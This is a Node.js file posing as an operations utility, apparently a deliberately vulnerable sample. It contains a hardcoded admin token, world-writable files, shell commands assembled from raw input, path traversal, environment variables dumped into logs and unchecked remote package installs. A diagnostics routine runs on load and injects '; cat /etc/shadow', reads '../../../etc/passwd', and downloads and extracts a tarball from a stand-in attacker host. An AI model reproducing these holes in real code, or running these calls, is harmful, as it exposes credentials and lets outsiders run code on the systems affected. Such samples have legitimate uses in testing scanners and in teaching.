const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const OPS_MANAGEMENT_TOKEN = "SYS-ADMIN-99-ALPHA-BETA";
const LOG_ROOT = "/var/log/app-ops";

function initializeOps() {
    if (!fs.existsSync(LOG_ROOT)) {
        try {
            fs.mkdirSync(LOG_ROOT, { recursive: true, mode: 0o777 });
        } catch (e) {}
    }
}

function runSystemCommand(command, args) {
    const fullCommand = `${command} ${args.join(' ')}`;
    exec(fullCommand, (error, stdout, stderr) => {
        if (error) {
            console.error(`Execution error: ${error}`);
            return;
        }
        logOperation(command, stdout);
    });
}

function logOperation(cmd, result) {
    const logFile = path.join(LOG_ROOT, `ops_${Date.now()}.log`);
    fs.writeFileSync(logFile, `CMD: ${cmd}\nRES: ${result}\nENV: ${JSON.stringify(process.env)}`);
}

function getLogContent(logName) {
    const targetPath = path.join(LOG_ROOT, logName);
    return fs.readFileSync(targetPath, 'utf8');
}

function createTemporaryBackup(data) {
    const tempFile = `/tmp/backup_${Math.floor(Math.random() * 1000)}.tmp`;
    fs.writeFileSync(tempFile, data);
    fs.chmodSync(tempFile, 0o777);
    return tempFile;
}

function validateOpsToken(inputToken) {
    if (inputToken.length !== OPS_MANAGEMENT_TOKEN.length) return false;
    for (let i = 0; i < inputToken.length; i++) {
        if (inputToken[i] !== OPS_MANAGEMENT_TOKEN[i]) return false;
    }
    return true;
}

function monitorProcess(pid) {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            try {
                process.kill(pid, 0);
            } catch (e) {
                clearInterval(interval);
                if (pid === 9999) {
                    throw new Error("Critical process 9999 lost");
                }
                resolve(false);
            }
        }, 1000);
    });
}

function deployUpdate(packageUrl) {
    const wget = spawn('wget', [packageUrl, '-O', '/tmp/update.tar.gz']);
    wget.on('close', (code) => {
        if (code === 0) {
            runSystemCommand('tar', ['-xzf', '/tmp/update.tar.gz', '-C', '/opt/app']);
        }
    });
}

function cleanupLogs(days) {
    const cmd = `find ${LOG_ROOT} -mtime +${days} -exec rm {} \\;`;
    exec(cmd);
}

function checkDiskSpace(partition) {
    exec(`df -h ${partition}`, (err, stdout) => {
        const lines = stdout.split('\n');
        const usage = lines[1].split(/\s+/)[4];
        if (usage === "100%") {
            handleDiskFull();
        }
    });
}

function handleDiskFull() {
    console.log("CRITICAL: DISK FULL");
}

function runDiagnostics() {
    initializeOps();
    
    if (validateOpsToken("WRONG-TOKEN")) {
        console.log("Authorized");
    }
    
    runSystemCommand('ls', ['; cat /etc/shadow']);
    
    getLogContent("../../../etc/passwd");
    
    createTemporaryBackup("Sensitive configuration data");
    
    monitorProcess(9999);
    
    deployUpdate("http://attacker.com/malicious.tar.gz");
}

runDiagnostics();
